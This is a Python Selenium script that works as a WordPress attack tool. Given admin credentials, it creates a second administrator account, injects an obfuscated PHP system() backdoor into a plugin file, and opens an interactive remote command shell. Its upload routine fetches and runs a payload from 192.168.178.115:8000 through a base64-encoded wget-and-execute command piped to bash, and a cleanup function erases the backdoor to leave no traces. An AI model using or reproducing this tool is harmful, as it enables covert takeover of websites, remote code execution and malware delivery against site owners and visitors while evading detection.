#!/usr/bin/python3
from selenium import webdriver
from selenium.webdriver.support.select import Select
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException
from bs4 import BeautifulSoup
import urllib.parse
import argparse, logging, sys
import base64

FORMAT = '[%(asctime)s] [%(levelname)-8s] [%(message)s]'
EDIT_PLUGIN_URL:str #URL to currently working plugin for php backdoor

def load_element(e_name, e_type='ID', timeout=5):
    '''
    It checks whether the specified ID, NAME or CLASS_NAME elements are loaded on the current page.
    The timeout specifies how long to wait before the script terminates
    '''
    try: 
        if e_type == 'ID':
            element_present = EC.presence_of_element_located((By.ID, e_name))
        elif e_type == 'NAME':
            element_present = EC.presence_of_element_located((By.NAME, e_name))
        elif e_type == 'CLASS':
            element_present = EC.presence_of_element_located((By.CLASS_NAME, e_name))
        WebDriverWait(driver, timeout).until(element_present)
    except TimeoutException:
        print(f"Timed out waiting for page to load by element[{e_type}] {e_name}")
        exit(-1)

# Login with username and password
def login(user, password):
    '''
    Log in with username and password. 
    If the login is invalid, the script exits.
    '''
    logging.info(f'Login with user: {user}')
    try:
        driver.get(args.url+'/wp-login.php')
        # clear and write to username field
        load_element('user_login')
        driver.find_element_by_id('user_login').clear()
        driver.find_element_by_id('user_login').send_keys(user)
        # clear and write to password field
        load_element('user_pass')
        driver.find_element_by_id('user_pass').clear()
        driver.find_element_by_id('user_pass').send_keys(password)
        # click login button
        load_element('wp-submit')
        driver.find_element_by_id('wp-submit').click()
        if 'Error' in driver.page_source:
            print("Invalider Login")
            exit(-1)
    except Exception as e:
        print(f'Login Failed : {e}')
        exit(-1)

def crate_user():
    '''
    The currently used user needs admin rights to create a new user.
    Crate a new user with given name, password and a fix email, this user also has admin rights.
    '''
    logging.info(f'Crate User {args.newUser}')
    try:
        load_element('adminmenuwrap') # load menu
        # go to "add new user" page
        driver.find_element_by_xpath("//a[@href ='users.php']").click()
        driver.find_element_by_xpath("//a[@href ='user-new.php']").click() 
        logging.info(f'Current Url: {driver.current_url}')
        # write user data in fields
        load_element('user_login')
        driver.find_element_by_id('user_login').send_keys(args.newUser)
        load_element('email')
        driver.find_element_by_id('email').send_keys('example@example.de')
        load_element('pass1')
        driver.find_element_by_id('pass1').clear()
        driver.find_element_by_id('pass1').send_keys(args.newPassword)
        # select password is weak
        load_element('pw_weak', 'NAME')
        driver.find_element_by_name('pw_weak').click()
        # select role admin
        load_element('role')
        driver.find_element_by_id('role').send_keys('Administrator')
        # click create user button 
        load_element('createusersub')
        driver.find_element_by_id('createusersub').click()
    except Exception as e:
        print(f'Crate User Failed : {e}')
        exit(-1)

def write_payload(c_p_name, f_name):
    '''
    Writes the php backdoor to the specified plugin name with the file name.
    The original plugin code is saved and added again after the php backdoor is placed.
    This will then go back to allow the cleanup function to use it.
    '''
    p_orginal = '' # orginal plugin code
    logging.info(f'Write Payload in Plugin:{c_p_name} with File:{f_name}')
    # orginal php backdoor "<?php system($_REQUEST[0]); ?>"
    payload = "<?php eval(gzinflate(base64_decode('K64sLknN1VCJD3INDHUNDok2iNW0BgA='))); ?>"
    try:
        # save orginal plugin code
        load_element('newcontent')
        p_orginal = driver.find_element_by_id('newcontent').get_attribute('value')
        # check if backdoor exists already
        if payload not in p_orginal:
            load_element('CodeMirror', 'CLASS')
            codeMirror = driver.find_element_by_class_name('CodeMirror')
            # inject payload at the start of the script
            driver.execute_script("arguments[0].CodeMirror.setValue(arguments[1]);", codeMirror, payload+p_orginal)
        else:
            # save orginal plugin code for cleanup
            logging.info('Backdoor exist already')
            p_orginal = p_orginal.replace(payload,"")
    except Exception as e:
        print(f'Write Payload Failed : {e}')
        exit(-1)
    return p_orginal

def cleanup(p_orginal):
    '''
    Removed the php backdoor from the plugin file, leaving no traces.
    '''
    logging.info('Start Cleanup')
    try:
        driver.get(EDIT_PLUGIN_URL)
        # overwrite backdoor with orginal plugin code
        load_element('CodeMirror', 'CLASS')
        codeMirror = driver.find_element_by_class_name("CodeMirror")
        driver.execute_script("arguments[0].CodeMirror.setValue(arguments[1]);", codeMirror, p_orginal)
        load_element('submit')
        driver.find_element_by_xpath("//input[@value='Update File']").click()
        load_element('notice-success','CLASS',20) # wait "File edited successfully."
    except Exception as e:
        print(f'Cleanup Failed : {e}')
        exit(-1)

def select_plugin():
    '''
    The currently used user needs admin rights to edit plugins.
    Outputs all existing plugins. You can then choose which plugin should be used for the PhP backdoor.
    Then calls the function write_payload with plugin name and file name, this information is also returned at the end.
    If no plugins are available, the script exits.
    '''
    global EDIT_PLUGIN_URL
    logging.info('Start Edit Plugin')
    try:
        load_element('adminmenuwrap') # load menu
        driver.find_element_by_xpath("//a[@href ='tools.php']").click()
        driver.find_element_by_xpath("//a[@href ='plugin-editor.php']").click()
        # Click on warning window
        try:
            driver.find_element_by_class_name('file-editor-warning-dismiss').click()
        except:
            pass
        load_element('plugin')
        p_all = Select(driver.find_element_by_id('plugin')) # Get all plugins
        # check plugin selection
        if len(p_all.options) == 0:
            print('There are no Plugins available')
            exit(-1)
        # ask for plugin name for php backdoor injection
        print("\n| Choose Plugin for Backdoor")
        try:
            while True:
                for p in p_all.options:
                    print(f'\t - [{p_all.options.index(p)}] {p.text}')
                num = input('Plugin Nummber: ')
                if num.lower() == 'exit':
                    driver.close()
                    print("Exit")
                    exit()
                elif num.isdigit() and int(num) >=0 and int(num) < len(p_all.options):
                    break
                else: 
                    print('Wrong Input: Choose a Plugin Nummber or exit')
        except KeyboardInterrupt:
            driver.close()
            exit()
        c_p_name = p_all.options[int(num)].text
        driver.find_element_by_id('plugin').send_keys(c_p_name)
        # click plugin select button
        load_element('submit')
        driver.find_element_by_xpath("//input[@value='Select']").click()
        url_edit = urllib.parse.unquote(driver.current_url)
        # get plugin name and file name 
        pf_name = url_edit.split('=')[-2].split('&')[0]
        p_name = pf_name.split('/')[0]
        f_name = pf_name.split('/')[1]
        logging.info(f'Current Url: {url_edit}')
        EDIT_PLUGIN_URL = driver.current_url
        p_orginal = write_payload(p_name, f_name) # write php backdoor in plugin file
        # click save edit plugin 
        driver.find_element_by_xpath("//input[@value='Update File']").click()
        load_element('notice-success','CLASS',20) # wait "File edited successfully."
    except Exception as e:
        print(f"Edit Plugin Fail : {e}")
        exit(-1)
    return p_name, f_name, p_orginal
    
def upload_malware(backdoor_url, file):
    try:
        ip = "192.168.178.115"
        cmd = f"wget http://{ip}:8000/{file}; chmod +x {file}; ./{file}"
        message_bytes = cmd.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        cmd = f'echo {base64_message} | base64 -d | /bin/bash'
        driver.get(f'{backdoor_url}?0={cmd}')
    except:
        pass


def exec_cmd(p_name, f_name, p_orginal):
    '''
    Checks whether the plugin file that owns the backdoor can be reached.
    System commands can now be sent through input.
    Special commands like cleanup or upload perform further functions.
    All commands are sent via http request. 
    For example: http://.../plugin.php?0=id
    '''
    driver.get(f'{args.url}/wp-content/plugins/{p_name}/{f_name}') 
    if '404' in driver.page_source:
        print('File with backdoor is missing or dont work')
        exit(-1)
    backdoor_url = driver.current_url # URL where the backdoor is located
    logging.info(f'Execute backdoor at: {backdoor_url}')
    # wait for user input
    while True:
        try:
            cmd = input("$ ")
            if cmd.lower() == 'exit': # exit script
                driver.quit()
                exit()
            elif cmd.lower() == 'cleanup': # start cleanup
                cleanup(p_orginal)
                break
            elif 'upload' == cmd.split(' ')[0]: # upload malware to target server
                file = cmd.split(' ')[1]
                upload_malware(backdoor_url, file)
            else: # send os command
                driver.get(f'{backdoor_url}?0={cmd}')
                cleantext = BeautifulSoup(driver.page_source, "lxml").text # remove html code from command output
                if 'HTTP ERROR 500' not in cleantext: # output only valide commands
                    print(cleantext)
        except KeyboardInterrupt:
            exit()
        except Exception as e:
            print(f'Comamnd Execution ERROR : {e}')

def main():
    print("\n| Start Selenium Script")
    login(args.user, args.password)
    # check if user have admin righs (default config: only admins can edit plugins or create users)
    if 'plugin-editor.php' not in driver.page_source or 'users.php' not in driver.page_source:
            print('Current User have no Administartion rights')
            driver.close()
            exit(-1)
    # create new user with admin rights
    if not args.skipCreateUser:    
        crate_user()
        login(args.newUser, args.newPassword) # login with new user
    # inject php backdoor in plugin file
    if not args.skipBackdoor:
        # return plugin name, file name and plugin orginal code
        p_name, f_name, p_orginal = select_plugin()
        exec_cmd(p_name, f_name, p_orginal)
    driver.get(args.url+'/wp-admin/index.php')
    print("\n| End")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Selenium script that create a second User with Administrator role and/or place a php backdoor in a plugin file for remote command execution')
    parser.add_argument('--url', required=True, type=str, help='Target Wordpress Url')
    parser.add_argument('-U', '--user', required=True, type=str, help='Admin username')
    parser.add_argument('-P', '--password', required=True, type=str, help='Admin password')
    parser.add_argument('-d', '--driver', required=True, help='Absolute path to the chromedriver')
    parser.add_argument('-nU', '--newUser', nargs='?', default='sele', type=str, help='Username for new user (Default: sele)')
    parser.add_argument('-nP', '--newPassword', nargs='?', default='pw123', type=str, help='Password for new user (Default: pw123)')
    parser.add_argument('-sC', '--skipCreateUser', action=argparse.BooleanOptionalAction, default=False, help='Dont create new user with admin rights')
    parser.add_argument('-sB', '--skipBackdoor', action=argparse.BooleanOptionalAction, default=False, help='Dont inject php backdoor in plugin file')
    parser.add_argument('-H', '--headless', action=argparse.BooleanOptionalAction, default=False, help='Start in headless mode, for no window')
    parser.add_argument('-log', '--level', default=50, type=int, help='Set Logging Level')
    args = parser.parse_args()
    args.url = args.url.rstrip('/')
    options = None # driver options
    if args.headless:
        # set driver options 
        options = webdriver.ChromeOptions()
        options.add_argument('headless')
        options.add_argument("disable-gpu")
    driver = webdriver.Chrome(args.driver, chrome_options=options)
    driver.set_window_size(1100,900)
    logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=args.level)
    main()


    
